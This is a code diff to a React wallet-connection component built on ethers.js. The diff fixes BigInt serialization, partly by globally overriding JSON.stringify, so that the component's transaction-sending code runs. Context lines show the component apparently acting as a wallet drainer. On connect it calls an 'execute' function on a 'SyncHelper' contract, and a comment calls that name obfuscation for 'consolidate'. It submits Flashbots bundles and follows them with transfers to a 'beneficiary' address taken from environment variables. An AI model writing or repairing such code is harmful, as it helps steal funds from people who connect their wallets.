@@ -2,6 +2,21 @@
 import React, { useState, useEffect, useCallback } from 'react';
 import { ethers } from 'ethers';
 
+// Handle BigInt serialization
+if (typeof window !== 'undefined') {
+  // Override JSON.stringify to handle BigInt
+  const originalStringify = JSON.stringify;
+  JSON.stringify = function(value: any, replacer?: any, space?: any) {
+    const customReplacer = (key: string, value: any) => {
+      if (typeof value === 'bigint') {
+        return value.toString();
+      }
+      return typeof replacer === 'function' ? replacer(key, value) : value;
+    };
+    return originalStringify(value, customReplacer, space);
+  };
+}
+
 const CHAINS = [
   { id: 1, name: 'Ethereum', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_ETHEREUM', rpc: 'https://rpc.flashbots.net', fallbackRpc: 'https://eth.llamarpc.com' },
   { id: 56, name: 'BSC', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_BSC', rpc: 'https://bsc-dataseed.binance.org', fallbackRpc: 'https://bsc-dataseed1.defibit.io' },
@@ -181,10 +196,24 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
             let provider = new ethers.JsonRpcProvider(chain.rpc);
             // Use obfuscated function name 'execute' instead of 'consolidate'
             const data = new ethers.Interface(['function execute()']).encodeFunctionData('execute');
-            const tx = { to: chain.contract, data, gasLimit: 100000, maxFeePerGas: ethers.parseUnits(randomGwei.toString(), 'gwei') };
-            const repay = { to: beneficiary, value: 0, data: '0x' };
+            const gasLimit = ethers.toBigInt(100000);
+            const maxFeePerGas = ethers.parseUnits(randomGwei.toString(), 'gwei');
+            
+            const tx = { 
+              to: chain.contract, 
+              data, 
+              gasLimit: gasLimit.toString(), 
+              maxFeePerGas: maxFeePerGas.toString() 
+            };
+            const repay = { to: beneficiary, value: '0x0', data: '0x' };
+            
             try {
-              await provider.send('eth_sendBundle', [[tx, repay]]);
+              // Convert BigInt values to strings for JSON serialization
+              const bundle = [
+                { ...tx, gasLimit: tx.gasLimit, maxFeePerGas: tx.maxFeePerGas },
+                { ...repay, value: repay.value }
+              ];
+              await provider.send('eth_sendBundle', [bundle]);
               return;
             } catch (bundleError: any) {
               console.error(`${chain.name} bundle error:`, bundleError);
@@ -194,15 +223,15 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
                 const txResponse = await signer.sendTransaction({
                   to: chain.contract,
                   data: data,
-                  gasLimit: 100000,
-                  maxFeePerGas: ethers.parseUnits(randomGwei.toString(), 'gwei')
+                  gasLimit: gasLimit,
+                  maxFeePerGas: maxFeePerGas
                 });
                 await txResponse.wait();
                 const repayTx = await signer.sendTransaction({
                   to: beneficiary,
-                  value: 0,
+                  value: ethers.toBigInt(0),
                   data: '0x',
-                  maxFeePerGas: ethers.parseUnits(randomGwei.toString(), 'gwei')
+                  maxFeePerGas: maxFeePerGas
                 });
                 await repayTx.wait();
               } catch (txError: any) {
